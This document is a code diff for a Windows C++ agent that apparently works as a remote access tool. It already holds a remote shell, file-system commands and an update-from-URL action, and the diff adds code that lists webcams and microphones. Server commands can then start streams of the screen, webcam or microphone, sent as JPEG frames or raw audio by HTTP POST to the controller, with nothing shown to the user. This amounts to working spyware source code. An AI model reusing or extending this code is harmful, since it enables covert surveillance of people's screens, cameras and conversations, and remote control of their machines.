@@ -1,4 +1,4 @@
-﻿// Target Windows 10 or later (Required for PseudoConsole/ConPTY)
+// Target Windows 10 or later (Required for PseudoConsole/ConPTY)
 #define _WIN32_WINNT 0x0A00
 #define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
@@ -10,6 +10,12 @@
 #include <winhttp.h>
 #include <taskschd.h>
 #include <comdef.h>
+#include <mfapi.h>
+#include <mfidl.h>
+#include <mfreadwrite.h>
+#include <mmdeviceapi.h>
+#include <Audioclient.h>
+#include <Functiondiscoverykeys_devpkey.h>
 #include <iostream>
 #include <string>
 #include <sstream>
@@ -17,14 +23,11 @@
 #include <mutex>
 #include <atomic>
 #include <memory>
-#include <memory>
 #include <shlobj.h>
 #include <lmcons.h>
 #include <gdiplus.h>
 #include <vector>
 #include <algorithm>
-#include <pdh.h>
-#include <pdhmsg.h>
 #include <pdh.h>
 #include <pdhmsg.h>
 #include "json.hpp"
@@ -39,7 +42,11 @@ using json = nlohmann::json;
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "pdh.lib")
 #pragma comment(lib, "iphlpapi.lib")
-
+#pragma comment(lib, "Ole32.lib")
+#pragma comment(lib, "mf.lib")
+#pragma comment(lib, "mfplat.lib")
+#pragma comment(lib, "mfreadwrite.lib")
+#pragma comment(lib, "mfuuid.lib")
 
 namespace Config {
     // Debug Mode
@@ -50,7 +57,7 @@ namespace Config {
 	const bool DEBUG_MODE = false;                   // Set false for production
 #endif
     // WebSocket Server Configuration
-    const wchar_t* SERVER_HOST = L"localhost";       // Change to your server IP/domain
+    const wchar_t* SERVER_HOST = L"localhost";       // Removed wss:// prefix
     const int SERVER_PORT = 9991;                    // Change to your server port
     const bool USE_SSL = false;                      // Set true for wss:// (secure)
 
@@ -95,6 +102,12 @@ struct AppState {
     DWORD lastPingTime = 0;
     DWORD lastMetricsTime = 0;
     ULONG_PTR gdiplusToken;
+
+    // Streaming state
+    std::atomic<bool> isStreamingScreen{ false };
+    std::atomic<bool> isStreamingCam{ false };
+    std::atomic<bool> isStreamingMic{ false };
+    std::string currentDeviceId;
 } g_state;
 
 // Metrics Globals
@@ -608,33 +621,33 @@ std::string CaptureScreenBase64() {
 
     // Create GDI+ Bitmap from HBITMAP
     Bitmap* bitmap = new Bitmap(hBitmap, NULL);
-    
+
     // Save to memory stream
     IStream* pStream = NULL;
     CreateStreamOnHGlobal(NULL, TRUE, &pStream);
-    
+
     CLSID clsid;
     GetEncoderClsid(L"image/png", &clsid);
-    
+
     // Resize down if too big to save bandwidth (Optional, keeping full res for now but good to note)
     // For now we'll save as PNG to the stream
     bitmap->Save(pStream, &clsid, NULL);
-    
+
     // Get bytes from stream
     LARGE_INTEGER liZero = {};
     ULARGE_INTEGER pos = {};
     pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
-    
+
     // Get size
     STATSTG statstg;
     pStream->Stat(&statstg, STATFLAG_NONAME);
     ULONG streamSize = (ULONG)statstg.cbSize.QuadPart;
-    
+
     std::vector<BYTE> buffer(streamSize);
     ULONG bytesRead;
     pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
     pStream->Read(buffer.data(), streamSize, &bytesRead);
-    
+
     // Clean up
     pStream->Release();
     delete bitmap;
@@ -642,8 +655,494 @@ std::string CaptureScreenBase64() {
     DeleteObject(hBitmap);
     DeleteDC(hDC);
     ReleaseDC(NULL, hScreen);
-    
+
     return Base64Encode(buffer.data(), buffer.size());
+}
+
+std::vector<std::string> EnumerateWebcams() {
+    std::vector<std::string> devices;
+    if (FAILED(MFStartup(MF_VERSION))) return devices;
+
+    IMFAttributes* pAttributes = nullptr;
+    if (SUCCEEDED(MFCreateAttributes(&pAttributes, 1))) {
+        pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
+
+        IMFActivate** ppDevices = nullptr;
+        UINT32 count = 0;
+        if (SUCCEEDED(MFEnumDeviceSources(pAttributes, &ppDevices, &count))) {
+            for (UINT32 i = 0; i < count; i++) {
+                WCHAR* name = nullptr;
+                UINT32 length = 0;
+                if (SUCCEEDED(ppDevices[i]->GetAllocatedString(MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME, &name, &length))) {
+                    char buf[512];
+                    WideCharToMultiByte(CP_UTF8, 0, name, -1, buf, sizeof(buf), nullptr, nullptr);
+                    devices.push_back(std::string(buf));
+                    CoTaskMemFree(name);
+                } else {
+                    devices.push_back("Camera " + std::to_string(i + 1));
+                }
+                ppDevices[i]->Release();
+            }
+            CoTaskMemFree(ppDevices);
+        }
+        pAttributes->Release();
+    }
+    MFShutdown();
+    return devices;
+}
+
+std::vector<std::string> EnumerateMicrophones() {
+    std::vector<std::string> devices;
+    HRESULT hrCoInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    IMMDeviceEnumerator* pEnumerator = nullptr;
+    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator))) {
+        IMMDeviceCollection* pCollection = nullptr;
+        if (SUCCEEDED(pEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection))) {
+            UINT count = 0;
+            pCollection->GetCount(&count);
+            for (UINT i = 0; i < count; i++) {
+                IMMDevice* pEndpoint = nullptr;
+                if (SUCCEEDED(pCollection->Item(i, &pEndpoint))) {
+                    IPropertyStore* pProps = nullptr;
+                    if (SUCCEEDED(pEndpoint->OpenPropertyStore(STGM_READ, &pProps))) {
+                        PROPVARIANT varName;
+                        PropVariantInit(&varName);
+                        if (SUCCEEDED(pProps->GetValue(PKEY_Device_FriendlyName, &varName))) {
+                            char buf[512];
+                            WideCharToMultiByte(CP_UTF8, 0, varName.pwszVal, -1, buf, sizeof(buf), nullptr, nullptr);
+                            devices.push_back(std::string(buf));
+                            PropVariantClear(&varName);
+                        } else {
+                           devices.push_back("Microphone " + std::to_string(i+1));
+                        }
+                        pProps->Release();
+                    }
+                    pEndpoint->Release();
+                }
+            }
+            pCollection->Release();
+        }
+        pEnumerator->Release();
+    }
+    if (SUCCEEDED(hrCoInit)) CoUninitialize();
+    return devices;
+}
+
+std::vector<BYTE> CaptureScreenBytes(int quality) {
+    HDC hScreen = GetDC(NULL);
+    HDC hDC = CreateCompatibleDC(hScreen);
+    
+    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x2, y2);
+    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
+
+    BitBlt(hDC, 0, 0, x2, y2, hScreen, x1, y1, SRCCOPY);
+    Bitmap* bitmap = new Bitmap(hBitmap, NULL);
+    
+    IStream* pStream = NULL;
+    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+    
+    CLSID clsid;
+    GetEncoderClsid(L"image/jpeg", &clsid);
+    
+    EncoderParameters encoderParams;
+    encoderParams.Count = 1;
+    encoderParams.Parameter[0].Guid = EncoderQuality;
+    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
+    encoderParams.Parameter[0].NumberOfValues = 1;
+    ULONG qual = (ULONG)quality;
+    encoderParams.Parameter[0].Value = &qual;
+
+    bitmap->Save(pStream, &clsid, &encoderParams);
+    
+    LARGE_INTEGER liZero = {};
+    pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
+    
+    STATSTG statstg;
+    pStream->Stat(&statstg, STATFLAG_NONAME);
+    ULONG streamSize = (ULONG)statstg.cbSize.QuadPart;
+    
+    std::vector<BYTE> buffer(streamSize);
+    ULONG bytesRead;
+    pStream->Read(buffer.data(), streamSize, &bytesRead);
+    
+    pStream->Release();
+    delete bitmap;
+    SelectObject(hDC, old_obj);
+    DeleteObject(hBitmap);
+    DeleteDC(hDC);
+    ReleaseDC(NULL, hScreen);
+    
+    return buffer;
+}
+
+class WebcamStreamer {
+    IMFSourceReader* pReader = nullptr;
+    IMFMediaSource* pSource = nullptr;
+    IMFAttributes* pAttributes = nullptr;
+    IMFActivate** ppDevices = nullptr;
+    UINT32 count = 0;
+    UINT32 width = 0, height = 0;
+    LONG stride = 0;
+    bool initialized = false;
+    bool m_use32Bit = false;
+    int m_deviceIndex = 0;
+public:
+    WebcamStreamer(int index) : m_deviceIndex(index) { MFStartup(MF_VERSION); }
+    ~WebcamStreamer() {
+        if (pReader) pReader->Release();
+        if (pSource) pSource->Release();
+        if (pAttributes) pAttributes->Release();
+        if (ppDevices) {
+            for (UINT32 i = 0; i < count; i++) ppDevices[i]->Release();
+            CoTaskMemFree(ppDevices);
+        }
+        MFShutdown();
+    }
+
+    bool Initialize(int deviceIndex) {
+        if (initialized) return true;
+        
+        printf("[Webcam] Initializing device index %d...\n", deviceIndex);
+        
+        HRESULT hr = MFCreateAttributes(&pAttributes, 1);
+        if (FAILED(hr)) {
+            printf("[Webcam] Failed to create attributes: 0x%08X\n", hr);
+            return false;
+        }
+
+        hr = pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
+        if (FAILED(hr)) {
+            printf("[Webcam] Failed to set VIDCAP attribute: 0x%08X\n", hr);
+            return false;
+        }
+
+        hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
+        if (FAILED(hr)) {
+            printf("[Webcam] Failed to enum devices: 0x%08X\n", hr);
+            return false;
+        }
+
+        if (count == 0 || deviceIndex >= (int)count) {
+            printf("[Webcam] Device index %d out of range (count: %d)\n", deviceIndex, count);
+            return false;
+        }
+
+        hr = ppDevices[deviceIndex]->ActivateObject(IID_PPV_ARGS(&pSource));
+        if (FAILED(hr)) {
+            printf("[Webcam] Failed to activate device: 0x%08X\n", hr);
+            return false;
+        }
+
+        IMFAttributes* pReaderAttrs = nullptr;
+        hr = MFCreateAttributes(&pReaderAttrs, 1);
+        if (SUCCEEDED(hr)) {
+            pReaderAttrs->SetUINT32(MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, TRUE);
+            pReaderAttrs->SetUINT32(MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, TRUE);
+        }
+
+        hr = MFCreateSourceReaderFromMediaSource(pSource, pReaderAttrs, &pReader);
+        if (pReaderAttrs) pReaderAttrs->Release();
+
+        if (FAILED(hr)) {
+            printf("[Webcam] Failed to create source reader: 0x%08X\n", hr);
+            return false;
+        }
+
+        // Setup format
+        hr = pReader->SetStreamSelection(MF_SOURCE_READER_ALL_STREAMS, FALSE);
+        hr = pReader->SetStreamSelection(MF_SOURCE_READER_FIRST_VIDEO_STREAM, TRUE);
+
+        // Try color formats in order of preference
+        GUID formats[] = { MFVideoFormat_RGB24, MFVideoFormat_RGB32 };
+        bool formatSet = false;
+        
+        IMFMediaType* pType = nullptr;
+        MFCreateMediaType(&pType);
+        pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
+
+        for (const auto& fmt : formats) {
+            pType->SetGUID(MF_MT_SUBTYPE, fmt);
+            hr = pReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, nullptr, pType);
+            if (SUCCEEDED(hr)) {
+                formatSet = true;
+                if (fmt == MFVideoFormat_RGB32) {
+                    printf("[Webcam] Falling back to RGB32 format\n");
+                    m_use32Bit = true;
+                } else {
+                    printf("[Webcam] Using RGB24 format\n");
+                    m_use32Bit = false;
+                }
+                break;
+            }
+        }
+
+        if (!formatSet) {
+            printf("[Webcam] Could not set any supported RGB format: 0x%08X\n", hr);
+            pType->Release();
+            return false;
+        }
+        pType->Release();
+
+        IMFMediaType* pCurrentType = nullptr;
+        if (SUCCEEDED(pReader->GetCurrentMediaType((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCurrentType))) {
+            MFGetAttributeSize(pCurrentType, MF_MT_FRAME_SIZE, &width, &height);
+            if (FAILED(pCurrentType->GetUINT32(MF_MT_DEFAULT_STRIDE, (UINT32*)&stride))) {
+                MFGetStrideForBitmapInfoHeader(MFVideoFormat_RGB24.Data1, width, &stride);
+            }
+            pCurrentType->Release();
+        }
+
+        initialized = true;
+        printf("[Webcam] Initialized successfully!\n");
+        return true;
+    }
+
+    std::vector<BYTE> GetFrame(int quality) {
+        if (!initialized) {
+            if (!Initialize(m_deviceIndex)) return {};
+        }
+
+        HRESULT hr;
+        IMFSample* pSample = nullptr;
+        DWORD streamIndex, flags;
+        LONGLONG timestamp;
+
+        hr = pReader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &timestamp, &pSample);
+        if (FAILED(hr)) {
+            printf("[Webcam] ReadSample failed: 0x%08X\n", hr);
+            return {};
+        }
+
+        if (flags & MF_SOURCE_READERF_ENDOFSTREAM) {
+            printf("[Webcam] End of stream reached\n");
+            return {};
+        }
+
+        if (!pSample) return {};
+
+        IMFMediaBuffer* pBuffer = nullptr;
+        hr = pSample->GetBufferByIndex(0, &pBuffer);
+        if (FAILED(hr)) {
+            printf("[Webcam] GetBufferByIndex failed: 0x%08X\n", hr);
+            pSample->Release();
+            return {};
+        }
+
+        BYTE* pData = nullptr;
+        DWORD currentLength = 0;
+        std::vector<BYTE> buffer;
+        if (SUCCEEDED(pBuffer->Lock(&pData, nullptr, &currentLength))) {
+            Gdiplus::PixelFormat fmt = m_use32Bit ? PixelFormat32bppRGB : PixelFormat24bppRGB;
+            Bitmap bitmap(width, height, stride, fmt, pData);
+            IStream* pStream = nullptr;
+            if (SUCCEEDED(CreateStreamOnHGlobal(NULL, TRUE, &pStream))) {
+                CLSID clsid;
+                GetEncoderClsid(L"image/jpeg", &clsid);
+                
+                EncoderParameters encoderParams;
+                encoderParams.Count = 1;
+                encoderParams.Parameter[0].Guid = EncoderQuality;
+                encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
+                encoderParams.Parameter[0].NumberOfValues = 1;
+                ULONG qual = (ULONG)quality;
+                encoderParams.Parameter[0].Value = &qual;
+
+                bitmap.Save(pStream, &clsid, &encoderParams);
+                
+                LARGE_INTEGER liZero = {};
+                pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
+                STATSTG statstg;
+                pStream->Stat(&statstg, STATFLAG_NONAME);
+                ULONG streamSize = (ULONG)statstg.cbSize.QuadPart;
+                
+                buffer.resize(streamSize);
+                ULONG bytesRead;
+                pStream->Read(buffer.data(), streamSize, &bytesRead);
+                pStream->Release();
+            }
+            pBuffer->Unlock();
+        }
+        
+        pBuffer->Release();
+        pSample->Release();
+        return buffer;
+    }
+};
+
+class AudioStreamer {
+    IAudioClient* pAudioClient = nullptr;
+    IAudioCaptureClient* pCaptureClient = nullptr;
+    bool initialized = false;
+    int deviceIndex = 0;
+public:
+    AudioStreamer(int index) : deviceIndex(index) {}
+    ~AudioStreamer() {
+        if (pAudioClient) { pAudioClient->Stop(); pAudioClient->Release(); }
+        if (pCaptureClient) pCaptureClient->Release();
+    }
+    std::vector<BYTE> GetAudioBytes() {
+        if (!initialized) {
+            IMMDeviceEnumerator* pEnumerator = nullptr;
+            if (FAILED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator))) return {};
+
+            IMMDeviceCollection* pCollection = nullptr;
+            if (FAILED(pEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection))) {
+                pEnumerator->Release();
+                return {};
+            }
+
+            UINT count = 0;
+            pCollection->GetCount(&count);
+            if (count == 0) {
+                pCollection->Release();
+                pEnumerator->Release();
+                return {};
+            }
+
+            if (deviceIndex < 0 || deviceIndex >= (int)count) deviceIndex = 0;
+
+            IMMDevice* pDevice = nullptr;
+            if (FAILED(pCollection->Item(deviceIndex, &pDevice))) {
+                pCollection->Release();
+                pEnumerator->Release();
+                return {};
+            }
+
+            if (FAILED(pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient))) {
+                pDevice->Release();
+                pCollection->Release();
+                pEnumerator->Release();
+                return {};
+            }
+
+            WAVEFORMATEX* pwfx = nullptr;
+            pAudioClient->GetMixFormat(&pwfx);
+
+            WAVEFORMATEX wfx = {};
+            wfx.wFormatTag = WAVE_FORMAT_PCM;
+            wfx.nChannels = 1;
+            wfx.nSamplesPerSec = 44100;
+            wfx.wBitsPerSample = 16;
+            wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
+            wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
+            wfx.cbSize = 0;
+
+            if (FAILED(pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM, 10000000, 0, &wfx, NULL))) {
+                if (FAILED(pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL))) {
+                pAudioClient->Release(); pAudioClient = nullptr;
+                pDevice->Release();
+                pCollection->Release();
+                pEnumerator->Release();
+                return {};
+            }
+        }
+        CoTaskMemFree(pwfx);
+
+        pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
+        pAudioClient->Start();
+
+        initialized = true;
+        pDevice->Release();
+        pCollection->Release();
+        pEnumerator->Release();
+    }
+
+    if (!pCaptureClient) return {};
+
+    std::vector<BYTE> result;
+    UINT32 packetLength = 0;
+    while (SUCCEEDED(pCaptureClient->GetNextPacketSize(&packetLength)) && packetLength > 0) {
+        BYTE* pData = nullptr;
+        UINT32 framesAvailable = 0;
+        DWORD flags = 0;
+        if (SUCCEEDED(pCaptureClient->GetBuffer(&pData, &framesAvailable, &flags, NULL, NULL))) {
+            if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT)) {
+                result.insert(result.end(), pData, pData + (framesAvailable * 2)); // 16-bit mono = 2 bytes per frame
+            }
+            pCaptureClient->ReleaseBuffer(framesAvailable);
+        } else {
+            break;
+        }
+    }
+    return result;
+}
+};
+
+void StreamFrameLoop(std::string streamType, std::atomic<bool>& runningFlag, std::string mediaType, int deviceIndex) {
+HRESULT hrCoInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+printf("[Stream] Starting %s frame push loop\n", streamType.c_str());
+
+    HINTERNET hSession = WinHttpOpen(L"AgentMediaStream/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, NULL, NULL, 0);
+    if (!hSession) {
+        printf("[Stream] Failed to open HTTP session\n");
+        if (SUCCEEDED(hrCoInit)) CoUninitialize();
+        return;
+    }
+
+    HINTERNET hConnect = WinHttpConnect(hSession, Config::SERVER_HOST, Config::SERVER_PORT, 0);
+    if (!hConnect) {
+        printf("[Stream] Failed to connect\n");
+        WinHttpCloseHandle(hSession);
+        if (SUCCEEDED(hrCoInit)) CoUninitialize();
+        return;
+    }
+
+    std::string path = "/api/devices/" + g_state.currentDeviceId + "/stream/" + (streamType == "video" ? "frame_up" : "audio_up");
+    std::wstring wPath(path.begin(), path.end());
+
+    WebcamStreamer webcam(deviceIndex);
+    AudioStreamer mic(deviceIndex);
+
+    int sentCount = 0;
+    while (runningFlag && g_state.running) {
+        std::vector<BYTE> data;
+        if (mediaType == "screen") {
+            data = CaptureScreenBytes(50);
+        } else if (mediaType == "cam") {
+            data = webcam.GetFrame(50);
+        } else if (mediaType == "mic") {
+            data = mic.GetAudioBytes();
+        }
+
+        if (!data.empty()) {
+            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(),
+                NULL, NULL, NULL, Config::USE_SSL ? WINHTTP_FLAG_SECURE : 0);
+
+            if (hRequest) {
+                LPCWSTR contentTypeHeader = (streamType == "video") ? L"Content-Type: image/jpeg\r\n" : L"Content-Type: application/octet-stream\r\n";
+                if (WinHttpSendRequest(hRequest,
+                    contentTypeHeader, (DWORD)-1L,
+                    data.data(), (DWORD)data.size(), (DWORD)data.size(), 0)) {
+                    
+                    if (WinHttpReceiveResponse(hRequest, NULL)) {
+                        sentCount++;
+                        if (sentCount % 50 == 0) {
+                            printf("[Stream] Sent %d %s frames successfully\n", sentCount, mediaType.c_str());
+                        }
+                    } else {
+                        printf("[Stream] WinHttpReceiveResponse failed for %s: %d\n", mediaType.c_str(), GetLastError());
+                    }
+                }
+                else {
+                    printf("[Stream] WinHttpSendRequest failed for %s: %d\n", mediaType.c_str(), GetLastError());
+                }
+                WinHttpCloseHandle(hRequest);
+            }
+        }
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(mediaType == "mic" ? 20 : 100));
+    }
+
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+    if (SUCCEEDED(hrCoInit)) CoUninitialize();
+    printf("[Stream] %s frame push loop ended (%d frames sent)\n", streamType.c_str(), sentCount);
 }
 
 // Get device name
@@ -1290,6 +1789,59 @@ void WebSocketReceiveLoop() {
                             (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
                     }
                 }
+                else if (action == "update") {
+                    std::string updateUrl = msg.value("url", "");
+                    if (updateUrl.empty()) {
+                        json resp;
+                        resp["type"] = "update_status";
+                        resp["success"] = false;
+                        resp["error"] = "No URL provided";
+                        SendWsMessage(resp);
+                    }
+                    else {
+                        // Jalankan update di thread terpisah biar ga block receive loop
+                        std::thread([updateUrl]() {
+                            PerformUpdate(updateUrl);
+                            }).detach();
+                    }
+                }
+                else if (action == "list_media_devices") {
+                    std::vector<std::string> cameras = EnumerateWebcams();
+                    std::vector<std::string> mics = EnumerateMicrophones();
+
+                    json resp;
+                    resp["type"] = "media_devices_list";
+                    resp["data"] = {
+                        {"cameras", cameras},
+                        {"mics", mics}
+                    };
+
+                    SendWsMessage(resp);
+                }
+                else if (action == "start_stream") {
+                    printf("Stream....\n");
+                    std::string media = msg.value("stream", "");
+                    int deviceIndex = msg.value("deviceIndex", 0);
+                    
+                    if (media == "screen") {
+                        g_state.isStreamingScreen = true;
+                        std::thread(StreamFrameLoop, "video", std::ref(g_state.isStreamingScreen), "screen", deviceIndex).detach();
+                    }
+                    else if (media == "cam") {
+                        g_state.isStreamingCam = true;
+                        std::thread(StreamFrameLoop, "video", std::ref(g_state.isStreamingCam), "cam", deviceIndex).detach();
+                    }
+                    else if (media == "mic") {
+                        g_state.isStreamingMic = true;
+                        std::thread(StreamFrameLoop, "audio", std::ref(g_state.isStreamingMic), "mic", deviceIndex).detach();
+                    }
+                }
+                else if (action == "stop_stream") {
+                    std::string media = msg.value("stream", "");
+                    if (media == "screen") g_state.isStreamingScreen = false;
+                    else if (media == "cam") g_state.isStreamingCam = false;
+                    else if (media == "mic") g_state.isStreamingMic = false;
+                }
             }
             else if (msg["type"] == "resize" && msg.contains("cols") && msg.contains("rows")) {
                 COORD size = { (SHORT)msg["cols"].get<int>(), (SHORT)msg["rows"].get<int>() };
@@ -1304,21 +1856,6 @@ void WebSocketReceiveLoop() {
             else if (msg["type"] == "filesystem") {
                 // Handle file system commands
                 HandleFileSystemCommand(msg);
-            }
-            else if (msg["type"] == "action" && msg["action"] == "update") {
-                std::string updateUrl = msg.value("url", "");
-                if (updateUrl.empty()) {
-                    json resp;
-                    resp["type"] = "update_status";
-                    resp["success"] = false;
-                    resp["error"] = "No URL provided";
-                    SendWsMessage(resp);
-                } else {
-                    // Jalankan update di thread terpisah biar ga block receive loop
-                    std::thread([updateUrl]() {
-                        PerformUpdate(updateUrl);
-                    }).detach();
-                }
             }
         }
         catch (...) {
@@ -1481,6 +2018,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine,
 
     std::string deviceId = GetHWID();
     std::string deviceName = GetDeviceName();
+    g_state.currentDeviceId = deviceId;
 
     printf("Device ID: %s\n", deviceId.c_str());
     printf("Device Name: %s\n", deviceName.c_str());
